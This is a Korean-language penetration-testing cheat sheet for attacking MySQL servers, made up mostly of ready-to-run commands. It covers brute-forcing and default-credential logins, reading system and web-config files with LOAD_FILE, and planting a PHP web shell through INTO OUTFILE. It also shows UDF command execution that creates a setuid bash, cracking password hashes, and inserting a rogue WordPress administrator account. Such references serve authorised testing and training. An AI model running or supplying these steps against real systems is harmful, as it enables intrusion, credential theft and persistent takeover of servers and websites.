# MySQL

# MySQL (3306)

관계형 데이터베이스. 기본 자격증명, 파일 읽기/쓰기, UDF를 통한 명령 실행이 주요 공격 벡터.

---

## 1. 열거

```bash
# nmap 스크립트
nmap -p 3306 --script=mysql-info,mysql-databases,mysql-users,mysql-empty-password <IP>
nmap -p 3306 --script=mysql-brute <IP>
nmap -sV -p 3306 <IP>
```

---

## 2. 접속

```bash
# 로컬 접속
mysql -u root -p
mysql -u root                      # 패스워드 없이
mysql -u root -p'password'         # 패스워드 인라인

# 원격 접속
mysql -h <IP> -u root -p
mysql -h <IP> -u root -p'password'
mysql -h <IP> -P 3306 -u root -p

# 기본 자격증명 시도
# root / (빈칸)
# root / root
# root / mysql
# root / password
# admin / admin

# 연결 테스트
mysql -h <IP> -u root --connect-timeout=5 -e "SELECT 1;" 2>/dev/null
```

---

## 3. 기본 명령어

```sql
-- 데이터베이스 목록
SHOW DATABASES;

-- 데이터베이스 선택
USE database_name;

-- 테이블 목록
SHOW TABLES;

-- 테이블 구조
DESCRIBE table_name;
SHOW COLUMNS FROM table_name;

-- 데이터 조회
SELECT * FROM users;
SELECT user, password FROM mysql.user;    -- MySQL 사용자 해시
SELECT user, authentication_string FROM mysql.user;    -- MySQL 5.7+

-- 현재 사용자
SELECT user();
SELECT current_user();

-- MySQL 버전
SELECT version();

-- 데이터 디렉터리
SHOW VARIABLES LIKE 'datadir';
SHOW VARIABLES LIKE 'secure_file_priv';    -- 파일 읽기/쓰기 허용 경로

-- 권한 확인
SHOW GRANTS;
SHOW GRANTS FOR 'user'@'localhost';
```

---

## 4. 파일 읽기 (FILE 권한 필요)

```sql
-- /etc/passwd 읽기
SELECT LOAD_FILE('/etc/passwd');

-- 웹 설정 파일 읽기
SELECT LOAD_FILE('/var/www/html/wp-config.php');
SELECT LOAD_FILE('/var/www/html/.env');

-- NULL이 반환되면 권한 없거나 파일 없음
-- secure_file_priv 확인
SHOW VARIABLES LIKE 'secure_file_priv';
```

---

## 5. 파일 쓰기 (INTO OUTFILE)

```sql
-- 웹쉘 작성 (웹 루트 쓰기 가능 + secure_file_priv 비활성화 시)
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';

-- 다른 경로 시도
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/shell.php';
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/srv/http/shell.php';

-- 권한 확인
SHOW VARIABLES LIKE 'secure_file_priv';
-- 비어있으면 = 제한 없음 (쓰기 가능)
-- NULL = 쓰기 불가
-- 경로 = 해당 경로에서만 가능
```

---

## 6. UDF (User Defined Function) — 명령 실행

MySQL의 사용자 정의 함수로 시스템 명령 실행. root 권한 + FILE 권한 필요.

```bash
# raptor_udf2.c 또는 lib_mysqludf_sys.so 사용
# GitHub: raptor/raptor_udf

# 1단계: UDF 라이브러리 업로드
# 플러그인 디렉터리 확인
SHOW VARIABLES LIKE 'plugin_dir';
# → /usr/lib/mysql/plugin/

# 2단계: 바이너리를 base64로 인코딩해서 MySQL에 쓰기
SELECT unhex('HEX_OF_SO_FILE') INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';

# 3단계: UDF 생성
CREATE FUNCTION sys_exec RETURNS int SONAME 'udf.so';

# 4단계: 명령 실행
SELECT sys_exec('id > /tmp/output');
SELECT sys_exec('cp /bin/bash /tmp/bash; chmod +s /tmp/bash');

# 정리
DROP FUNCTION sys_exec;
```

---

## 7. 해시 크래킹

```sql
-- MySQL 사용자 해시 추출
SELECT user, password FROM mysql.user;
SELECT user, authentication_string FROM mysql.user;
```

```bash
# MySQL 해시 크랙
# 형식: *HASH (SHA1 기반)
hashcat -m 300 mysql_hash.txt /usr/share/wordlists/rockyou.txt
john --format=mysql-sha1 mysql_hash.txt --wordlist=rockyou.txt
```

---

## 8. 브루트포스

```bash
# hydra
hydra -l root -P /usr/share/wordlists/rockyou.txt <IP> mysql

# medusa
medusa -h <IP> -u root -P rockyou.txt -M mysql

# nmap
nmap -p 3306 --script=mysql-brute --script-args userdb=users.txt,passdb=pass.txt <IP>
```

---

## 9. WordPress DB에서 자격증명 탈취

```sql
USE wordpress;
SELECT user_login, user_pass FROM wp_users;

-- 새 관리자 추가
INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_status)
VALUES ('hacker', MD5('hacked123'), 'hacker', 'hacker@hack.com', '0');

INSERT INTO wp_usermeta (umeta_id, user_id, meta_key, meta_value)
VALUES (NULL,
  (SELECT ID FROM wp_users WHERE user_login = 'hacker'),
  'wp_capabilities',
  'a:1:{s:13:"administrator";s:1:"1";}');
```

---

## 팁

- `secure_file_priv = ""` 이면 파일 읽기/쓰기 모두 가능
- 원격 접속이 허용된 계정 확인: `SELECT host, user FROM mysql.user`
- 웹 앱 DB 접속 계정은 보통 제한적 → root 계정이 다를 수 있음
- `mysqldump`로 전체 DB 덤프 가능 (자격증명 획득 시)